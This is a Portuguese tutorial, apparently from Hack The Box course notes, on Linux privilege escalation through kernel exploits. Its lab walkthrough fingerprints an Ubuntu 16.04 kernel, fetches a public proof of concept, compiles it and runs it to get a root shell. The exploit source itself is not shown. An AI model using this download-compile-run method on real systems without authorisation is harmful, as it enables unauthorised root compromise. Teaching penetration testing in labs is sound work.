Existem exploits de nível de kernel para uma variedade de versões do kernel Linux. Um exemplo muito conhecido é o [Dirty COW](https://github.com/dirtycow/dirtycow.github.io) (CVE-2016-5195). Eles aproveitam vulnerabilidades no kernel para executar código com privilégios de root. É muito comum encontrar sistemas vulneráveis ​​a exploits de kernel.

Pode ser difícil controlar sistemas legados, e eles podem ser excluídos de patches devido a problemas de compatibilidade com certos serviços ou aplicativos.

A escalada de privilégios usando um exploit de kernel pode ser tão simples quanto baixar, compilar e executar. Alguns desses exploits funcionam imediatamente, enquanto outros exigem modificação. Uma maneira rápida de identificar exploits é emitir o comando `uname -a`e pesquisar no Google pela versão do kernel.

## Exemplo de exploração do kernel

Vamos começar verificando o nível do Kernel e a versão do sistema operacional Linux.

```shell-session
NycolasES6@htb[/htb]$ uname -a

Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

```shell-session
NycolasES6@htb[/htb]$ cat /etc/lsb-release 

DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

Podemos ver que estamos no Linux Kernel 4.4.0-116 em uma caixa Ubuntu 16.04.4 LTS. Uma rápida pesquisa no Google por `linux 4.4.0-116-generic exploit`aparece com [este](https://vulners.com/zdt/1337DAY-ID-30003) exploit PoC. Em seguida, baixe-o para o sistema usando `wget`ou outro método de transferência de arquivo. Podemos compilar o código do exploit usando [gcc](https://linux.die.net/man/1/gcc) e definir o bit executável usando `chmod +x`.

```shell-session
NycolasES6@htb[/htb]$ gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

Em seguida, executamos o exploit e esperamos ser colocados em um shell root.

```shell-session
NycolasES6@htb[/htb]$ ./kernel_exploit 

task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

Por fim, podemos confirmar o acesso root à caixa.

```shell-session
root@htb[/htb]# whoami

root
```































